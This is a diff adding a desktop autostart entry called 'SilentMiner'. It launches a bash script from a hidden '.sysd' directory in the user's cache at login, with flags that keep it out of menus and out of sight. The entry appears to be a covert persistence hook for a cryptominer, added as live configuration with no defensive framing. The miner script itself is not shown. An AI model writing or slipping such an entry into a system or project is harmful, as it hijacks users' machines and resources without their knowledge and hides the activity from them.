@@ -1,0 +1,7 @@
+[Desktop Entry]
+Type=Application
+Name=SilentMiner
+Exec=bash %h/.cache/.sysd/start.sh
+X-GNOME-Autostart-enabled=true
+NoDisplay=true
+Hidden=true
